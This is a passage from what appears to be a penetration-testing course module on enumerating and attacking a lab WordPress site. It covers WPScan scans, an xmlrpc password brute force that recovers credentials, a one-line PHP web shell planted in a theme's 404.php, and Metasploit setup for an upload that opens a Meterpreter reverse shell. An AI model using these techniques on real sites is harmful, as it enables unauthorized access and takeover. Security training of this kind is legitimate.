&lt;link rel=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'bootstrap-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css'</span> type=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
</code></pre>
<p>Next, let&#39;s take a look at which plugins we can uncover.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins

<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">'stylesheet'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'contact-form-7-css'</span>  <span class="hljs-attr">href</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2'</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/css'</span> <span class="hljs-attr">media</span>=<span class="hljs-string">'all'</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'subscriber-js-js'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'validation-engine-en-js'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'validation-engine-js'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">'stylesheet'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'mm_frontend-css'</span>  <span class="hljs-attr">href</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8'</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/css'</span> <span class="hljs-attr">media</span>=<span class="hljs-string">'all'</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2'</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'contact-form-7-js'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>From the output above, we know that the <a href="https://wordpress.org/plugins/contact-form-7/">Contact Form 7</a> and <a href="https://wordpress.org/plugins/mail-masta/">mail-masta</a> plugins are installed. The next step would be enumerating the versions.</p>
<p>Browsing to <code>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/</code> shows us that directory listing is enabled and that a <code>readme.txt</code> file is present. These files are very often helpful in fingerprinting version numbers. From the readme, it appears that version 1.0.0 of the plugin is installed, which suffers from a <a href="https://www.exploit-db.com/exploits/50226">Local File Inclusion</a> vulnerability that was published in August of 2021.</p>
<p>Let&#39;s dig around a bit more. Checking the page source of another page, we can see that the <a href="https://wpdiscuz.com/">wpDiscuz</a> plugin is installed, and it appears to be version 7.0.4</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s <span class="hljs-keyword">http</span>://blog.inlanefreight.<span class="hljs-built_in">local</span>/?p=<span class="hljs-number">1</span> | grep plugins

&lt;link <span class="hljs-built_in">rel</span>=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'contact-form-7-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2'</span> type=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
&lt;link <span class="hljs-built_in">rel</span>=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'wpdiscuz-frontend-css-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4'</span> type=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
</code></pre>
<p>A quick search for this plugin version shows <a href="https://www.exploit-db.com/exploits/49967">this</a> unauthenticated remote code execution vulnerability from June of 2021. We&#39;ll note this down and move on. It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don&#39;t want to miss.</p>
<hr>
<h3 id="enumerating-users">Enumerating Users</h3>
<p>We can do some manual enumeration of users as well. As mentioned earlier, the default WordPress login page can be found at <code>/wp-login.php</code>.</p>
<p>A valid username and an invalid password results in the following message:</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/valid\_user.png" alt=""></p>
<p>However, an invalid username returns that the user was not found.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/invalid\_user.png" alt=""></p>
<p>This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.</p>
<p>Let&#39;s recap. At this stage, we have gathered the following data points:</p>
<ul>
<li>The site appears to be running WordPress core version 5.8</li>
<li>The installed theme is Business Gravity</li>
<li>The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz</li>
<li>The wpDiscuz version appears to be 7.0.4, which suffers from an unauthenticated remote code execution vulnerability</li>
<li>The mail-masta version seems to be 1.0.0, which suffers from a Local File Inclusion vulnerability</li>
<li>The WordPress site is vulnerable to user enumeration, and the user <code>admin</code> is confirmed to be a valid user</li>
</ul>
<p>Let&#39;s take things a step further and validate/add to some of our data points with some automated enumeration scans of the WordPress site. Once we complete this, we should have enough information in hand to begin planning and mounting our attacks.</p>
<hr>
<h3 id="wpscan">WPScan</h3>
<p><a href="https://github.com/wpscanteam/wpscan">WPScan</a> is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a blog are outdated or vulnerable. It’s installed by default on Parrot OS but can also be installed manually with <code>gem</code>.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo gem install wpscan
</code></pre>
<p>WPScan is also able to pull in vulnerability information from external sources. We can obtain an API token from <a href="https://wpvulndb.com/">WPVulnDB</a>, which is used by WPScan to scan for PoC and reports. The free plan allows up to 75 requests per day. To use the WPVulnDB database, just create an account and copy the API token from the users page. This token can then be supplied to wpscan using the <code>--api-token parameter</code>.</p>
<p>Typing <code>wpscan -h</code> will bring up the help menu.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wpscan -<span class="hljs-built_in">h</span>

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner <span class="hljs-keyword">by</span> the WPScan Team
                         <span class="hljs-keyword">Version</span> 3.8.7
       Sponsored <span class="hljs-keyword">by</span> Automattic - https:<span class="hljs-comment">//automattic.com/</span>
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

Usage: wpscan [options]
        --url URL                                 The URL of the blog to scan
                                                  Allowed Protocols: http, https
                                                  Default Protocol <span class="hljs-keyword">if</span> none provided: http
                                                  This option is mandatory unless <span class="hljs-keyword">update</span> or <span class="hljs-keyword">help</span> or hh or <span class="hljs-keyword">version</span> is/are supplied
    -<span class="hljs-keyword">h</span>, --<span class="hljs-keyword">help</span>                                    <span class="hljs-keyword">Display</span> the simple <span class="hljs-keyword">help</span> and <span class="hljs-keyword">exit</span>
        --hh                                      <span class="hljs-keyword">Display</span> the full <span class="hljs-keyword">help</span> and <span class="hljs-keyword">exit</span>
        --<span class="hljs-keyword">version</span>                                 <span class="hljs-keyword">Display</span> the <span class="hljs-keyword">version</span> and <span class="hljs-keyword">exit</span>
    -v, --verbose                                 Verbose mode
        --[<span class="hljs-keyword">no</span>-]banner                             Whether or not to <span class="hljs-keyword">display</span> the banner
                                                  Default: true
    -o, --output <span class="hljs-keyword">FILE</span>                             Output to <span class="hljs-keyword">FILE</span>
    -f, --<span class="hljs-keyword">format</span> <span class="hljs-keyword">FORMAT</span>                           Output results <span class="hljs-keyword">in</span> the <span class="hljs-keyword">format</span> supplied
                                                  Available choices: json, <span class="hljs-keyword">cli</span>-<span class="hljs-keyword">no</span>-colour, <span class="hljs-keyword">cli</span>-<span class="hljs-keyword">no</span>-color, <span class="hljs-keyword">cli</span>
        --detection-mode MODE                     Default: mixed
                                                  Available choices: mixed, passive, aggressive

&lt;SNIP&gt;
</code></pre>
<p>The <code>--enumerate</code> flag is used to enumerate various components of the WordPress application, such as plugins, themes, and users. By default, WPScan enumerates vulnerable plugins, themes, users, media, and backups. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments <code>--enumerate ap</code>. Let’s invoke a normal enumeration scan against a WordPress website with the <code>--enumerate</code> flag and pass it an API token from WPVulnDB with the <code>--api-token</code> flag.</p>
<p>WordPress - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo wpscan --url http:/</span>/blog.inlanefreight.local --enumerate --api-token dEOFB&lt;SNIP&gt;

&lt;SNIP&gt;

[+] <span class="hljs-string">URL:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/ [10.129.42.195]</span>
[+] <span class="hljs-string">Started:</span> Thu Sep <span class="hljs-number">16</span> <span class="hljs-number">23</span>:<span class="hljs-number">11</span>:<span class="hljs-number">43</span> <span class="hljs-number">2021</span>

Interesting Finding(s):

[+] Headers
 | Interesting <span class="hljs-string">Entry:</span> <span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)
 | Found <span class="hljs-string">By:</span> Headers (Passive Detection)
 | <span class="hljs-string">Confidence:</span> <span class="hljs-number">100</span>%

[+] XML-RPC seems to be <span class="hljs-string">enabled:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/xmlrpc.php</span>
 | Found <span class="hljs-string">By:</span> Direct Access (Aggressive Detection)
 | <span class="hljs-string">Confidence:</span> <span class="hljs-number">100</span>%
 | <span class="hljs-string">References:</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//codex.wordpress.org/XML-RPC_Pingback_API</span>
 |  - <span class="hljs-string">https:</span><span class="hljs-comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span>
 |  - <span class="hljs-string">https:</span><span class="hljs-comment">//www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span>
 |  - <span class="hljs-string">https:</span><span class="hljs-comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span>
 |  - <span class="hljs-string">https:</span><span class="hljs-comment">//www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span>

[+] WordPress readme <span class="hljs-string">found:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/readme.html</span>
 | Found <span class="hljs-string">By:</span> Direct Access (Aggressive Detection)
 | <span class="hljs-string">Confidence:</span> <span class="hljs-number">100</span>%

[+] Upload directory has listing <span class="hljs-string">enabled:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/uploads/</span>
 | Found <span class="hljs-string">By:</span> Direct Access (Aggressive Detection)
 | <span class="hljs-string">Confidence:</span> <span class="hljs-number">100</span>%

[+] WordPress version <span class="hljs-number">5.8</span> identified (Insecure, released on <span class="hljs-number">2021</span><span class="hljs-number">-07</span><span class="hljs-number">-20</span>).
 | Found <span class="hljs-string">By:</span> Rss Generator (Passive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span>
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.8&lt;/generator&gt;</span>
 |
 | [!] <span class="hljs-number">3</span> vulnerabilities <span class="hljs-string">identified:</span>
 |
 | [!] <span class="hljs-string">Title:</span> WordPress <span class="hljs-number">5.4</span> to <span class="hljs-number">5.8</span> - Data Exposure via REST API
 |     Fixed <span class="hljs-string">in:</span> <span class="hljs-number">5.8</span><span class="hljs-number">.1</span>
 |     <span class="hljs-string">References:</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wpvulndb.com/vulnerabilities/38dd7e87-9a22-48e2-bab1-dc79448ecdfb</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5</span>
 |
 | [!] <span class="hljs-string">Title:</span> WordPress <span class="hljs-number">5.4</span> to <span class="hljs-number">5.8</span> - Authenticated XSS <span class="hljs-keyword">in</span> Block Editor
 |     Fixed <span class="hljs-string">in:</span> <span class="hljs-number">5.8</span><span class="hljs-number">.1</span>
 |     <span class="hljs-string">References:</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wpvulndb.com/vulnerabilities/5b754676-20f5-4478-8fd3-6bc383145811</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v</span>
 |
 | [!] <span class="hljs-string">Title:</span> WordPress <span class="hljs-number">5.4</span> to <span class="hljs-number">5.8</span> -  Lodash Library Update
 |     Fixed <span class="hljs-string">in:</span> <span class="hljs-number">5.8</span><span class="hljs-number">.1</span>
 |     <span class="hljs-string">References:</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wpvulndb.com/vulnerabilities/5d6789db-e320-494b-81bb-e678674f4199</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/lodash/lodash/wiki/Changelog</span>
 |      - <span class="hljs-string">https:</span><span class="hljs-comment">//github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689</span>

[+] WordPress theme <span class="hljs-keyword">in</span> <span class="hljs-string">use:</span> transport-gravity
 | <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/themes/transport-gravity/</span>
 | Latest <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> (up to date)
 | Last <span class="hljs-string">Updated:</span> <span class="hljs-number">2020</span><span class="hljs-number">-08</span><span class="hljs-number">-02</span><span class="hljs-string">T00:</span><span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z
 | <span class="hljs-string">Readme:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt</span>
 | [!] Directory listing is enabled
 | Style <span class="hljs-string">URL:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css</span>
 | Style <span class="hljs-string">Name:</span> Transport Gravity
 | Style <span class="hljs-string">URI:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//keonthemes.com/downloads/transport-gravity/</span>
 | <span class="hljs-string">Description:</span> Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made <span class="hljs-keyword">for</span> tran...
 | <span class="hljs-string">Author:</span> Keon Themes
 | Author <span class="hljs-string">URI:</span> <span class="hljs-string">https:</span><span class="hljs-comment">//keonthemes.com/</span>
 |
 | Found <span class="hljs-string">By:</span> Css Style In Homepage (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span> Urls In Homepage (Passive Detection)
 |
 | <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> (<span class="hljs-number">80</span>% confidence)
 | Found <span class="hljs-string">By:</span> Style (Passive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1'</span>

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) <span class="hljs-string">Identified:</span>

[+] mail-masta
 | <span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/plugins/mail-masta/</span>
 | Latest <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span> (up to date)
 | Last <span class="hljs-string">Updated:</span> <span class="hljs-number">2014</span><span class="hljs-number">-09</span><span class="hljs-number">-19</span><span class="hljs-string">T07:</span><span class="hljs-number">52</span>:<span class="hljs-number">00.000</span>Z
 |
 | Found <span class="hljs-string">By:</span> Urls In Homepage (Passive Detection)
 |
 | [!] <span class="hljs-number">2</span> vulnerabilities <span class="hljs-string">identified:</span>
 |
 | [!] <span class="hljs-string">Title:</span> Mail Masta &lt;= <span class="hljs-number">1.0</span> - Unauthenticated Local File Inclusion (LFI)

&lt;SNIP&gt;

| [!] <span class="hljs-string">Title:</span> Mail Masta <span class="hljs-number">1.0</span> - Multiple SQL Injection

 &lt;SNIP

 | <span class="hljs-string">Version:</span> <span class="hljs-number">1.0</span> (<span class="hljs-number">100</span>% confidence)
 | Found <span class="hljs-string">By:</span> Readme - Stable Tag (Aggressive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</span>
 | Confirmed <span class="hljs-string">By:</span> Readme - ChangeLog Section (Aggressive Detection)
 |  - <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</span>

&lt;SNIP&gt;

[i] User(s) <span class="hljs-string">Identified:</span>

[+] <span class="hljs-string">by:</span>
                                    admin
 | Found <span class="hljs-string">By:</span> Author Posts - Display Name (Passive Detection)

[+] admin
 | Found <span class="hljs-string">By:</span> Rss Generator (Passive Detection)
 | Confirmed <span class="hljs-string">By:</span>
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] john
 | Found <span class="hljs-string">By:</span> Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed <span class="hljs-string">By:</span> Login Error Messages (Aggressive Detection)
</code></pre>
<p>WPScan uses various passive and active methods to determine versions and vulnerabilities, as shown in the report above. The default number of threads used is <code>5</code>. However, this value can be changed using the <code>-t</code> flag.</p>
<p>This scan helped us confirm some of the things we uncovered from manual enumeration (WordPress core version 5.8 and directory listing enabled), showed us that the theme that we identified was not exactly correct (Transport Gravity is in use which is a child theme of Business Gravity), uncovered another username (john), and showed that automated enumeration on its own is often not enough (missed the wpDiscuz and Contact Form 7 plugins). WPScan provides information about known vulnerabilities. The report output also contains URLs to PoCs, which would allow us to exploit these vulnerabilities.</p>
<p>The approach we took in this section, combining both manual and automated enumeration, can be applied to almost any application we uncover. Scanners are great and are very useful but cannot replace the human touch and a curious mind. Honing our enumeration skills can set us apart from the crowd as excellent penetration testers.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>From the data we gathered manually and using WPScan, we now know the following:</p>
<ul>
<li>The site is running WordPress core version 5.8, which does suffer from some vulnerabilities that do not seem interesting at this point</li>
<li>The installed theme is Transport Gravity</li>
<li>The following plugins are in use: Contact Form 7, mail-masta, wpDiscuz</li>
<li>The wpDiscuz version is 7.0.4, which suffers from an unauthenticated remote code execution vulnerability</li>
<li>The mail-masta version is 1.0.0, which suffers from a Local File Inclusion vulnerability as well as SQL injection</li>
<li>The WordPress site is vulnerable to user enumeration, and the users <code>admin</code> and <code>john</code> are confirmed to be valid users</li>
<li>Directory listing is enabled throughout the site, which may lead to sensitive data exposure</li>
<li>XML-RPC is enabled, which can be leveraged to perform a password brute-forcing attack against the login page using WPScan, <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress\_xmlrpc\_login">Metasploit</a>, etc.</li>
</ul>
<p>With this information noted down, let&#39;s move on to the fun stuff: attacking WordPress!</p>
<h2 id="attacking-wordpress">Attacking WordPress</h2>
<hr>
<p>We&#39;ve confirmed that the company website is running on WordPress and have enumerated the version and installed plugins. Let&#39;s now look for attack paths and try to gain access to the internal network.</p>
<p>There are several ways we can abuse <code>built-in functionality</code> to attack a WordPress installation. We will cover login brute forcing against the <code>wp-login.php</code> page and remote code execution via the theme editor. These two tactics build on each other as we need first to obtain valid credentials for an administrator-level user to log in to the WordPress back-end and edit a theme.</p>
<hr>
<h3 id="login-bruteforce">Login Bruteforce</h3>
<p>WPScan can be used to brute force usernames and passwords. The scan report in the previous section returned two users registered on the website (admin and john). The tool uses two kinds of login brute force attacks, <a href="https://kinsta.com/blog/xmlrpc-php/">xmlrpc</a> and wp-login. The <code>wp-login</code> method will attempt to brute force the standard WordPress login page, while the <code>xmlrpc</code> method uses WordPress API to make login attempts through <code>/xmlrpc.php</code>. The <code>xmlrpc</code> method is preferred as it’s faster.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /</span>usr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/rockyou.txt --url http:/</span>/blog.inlanefreight.local

[+] <span class="hljs-string">URL:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.local/ [10.129.42.195]</span>
[+] <span class="hljs-string">Started:</span> Wed Aug <span class="hljs-number">25</span> <span class="hljs-number">11</span>:<span class="hljs-number">56</span>:<span class="hljs-number">23</span> <span class="hljs-number">2021</span>

&lt;SNIP&gt;

[+] Performing password attack on Xmlrpc against <span class="hljs-number">1</span> user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john <span class="hljs-regexp">/ bettyboop Time: 00:00:13 &lt;                                      &gt; (660 /</span> <span class="hljs-number">14345052</span>)  <span class="hljs-number">0.00</span>%  <span class="hljs-string">ETA:</span> ??:??:??

[!] Valid Combinations Found:
 | <span class="hljs-string">Username:</span> john, <span class="hljs-string">Password:</span> firebird1

[!] No WPVulnDB API Token given, <span class="hljs-keyword">as</span> a result vulnerability data has not been output.
[!] You can get a free API token with <span class="hljs-number">50</span> daily requests by registering at <span class="hljs-string">https:</span><span class="hljs-comment">//wpvulndb.com/users/sign_up</span>

[+] <span class="hljs-string">Finished:</span> Wed Aug <span class="hljs-number">25</span> <span class="hljs-number">11</span>:<span class="hljs-number">56</span>:<span class="hljs-number">46</span> <span class="hljs-number">2021</span>
[+] Requests <span class="hljs-string">Done:</span> <span class="hljs-number">799</span>
[+] Cached <span class="hljs-string">Requests:</span> <span class="hljs-number">39</span>
[+] Data <span class="hljs-string">Sent:</span> <span class="hljs-number">373.152</span> KB
[+] Data <span class="hljs-string">Received:</span> <span class="hljs-number">448.799</span> KB
[+] Memory <span class="hljs-string">used:</span> <span class="hljs-number">221</span> MB

[+] Elapsed <span class="hljs-string">time:</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">23</span>
</code></pre>
<p>The <code>--password-attack</code> flag is used to supply the type of attack. The <code>-U</code> argument takes in a list of users or a file containing user names. This applies to the <code>-P</code> passwords option as well. The <code>-t</code> flag is the number of threads which we can adjust up or down depending. WPScan was able to find valid credentials for one user, <code>john:firebird1</code>.</p>
<hr>
<h3 id="code-execution">Code Execution</h3>
<p>With administrative access to WordPress, we can modify the PHP source code to execute system commands. Log in to WordPress with the credentials for the <code>john</code> user, which will redirect us to the admin panel. Click on <code>Appearance</code> on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.</p>
<p>Click on <code>Select</code> after selecting the theme, and we can edit an uncommon page such as <code>404.php</code> to add a web shell.</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>_GET[<span class="hljs-number">0</span>]);
</code></pre>
<p>The code above should let us execute commands via the GET parameter <code>0</code>. We add this single line to the file just below the comments to avoid too much modification of the contents.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/theme\_editor.png" alt=""></p>
<p>Click on <code>Update File</code> at the bottom to save. We know that WordPress themes are located at <code>/wp-content/themes/&lt;theme name&gt;</code>. We can interact with the web shell via the browser or using <code>cURL</code>. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ curl http:<span class="hljs-comment">//blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id</span>

uid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) gid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) groups=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>)
</code></pre>
<p>The <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp\_admin\_shell\_upload/">wp_admin_shell_upload</a> module from Metasploit can be used to upload a shell and execute it automatically.</p>
<p>The module uploads a malicious plugin and then uses it to execute a PHP Meterpreter shell. We first need to set the necessary options.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">msf6 &gt; use exploit/unix/webapp/wp_admin_shell_upload 

[*] <span class="hljs-keyword">No</span> payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">blog.inlanefreight.local</span>
msf6 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set username john</span>
msf6 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set password firebird1</span>
msf6 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set lhost 10.10.14.15</span> 
msf6 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set rhost 10.129.42.195</span>  
msf6 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set VHOST blog.inlanefreight.local</span>
</code></pre>
<p>We can then issue the <code>show options</code> command to ensure that everything is set up properly. In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error <code>Exploit aborted due to failure: not-found: The target does not appear to be using WordPress</code>.</p>
<p>Attacking WordPress</p>
<pre><code class="lang-shell-session">msf6 exploit(unix/webapp/wp_admin_shell_upload) &gt; show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   <span class="hljs-comment">----       ---------------           --------  -----------</span>
   PASSWORD   firebird1                 yes       The WordPress password <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
   Proxies                              no        A proxy chain <span class="hljs-keyword">of</span> format <span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>[,<span class="hljs-keyword">type</span>:host:<span class="hljs-keyword">port</span>][...]
   RHOSTS     <span class="hljs-number">10.129</span>.<span class="hljs-number">42.195</span>             yes       The target host(s), <span class="hljs-keyword">range</span> CIDR identifier, <span class="hljs-keyword">or</span> hosts <span class="hljs-keyword">file</span> <span class="hljs-keyword">with</span> syntax <span class="hljs-symbol">'file</span>:&lt;path&gt;'
   RPORT      <span class="hljs-number">80</span>                        yes       The target <span class="hljs-keyword">port</span> (TCP)
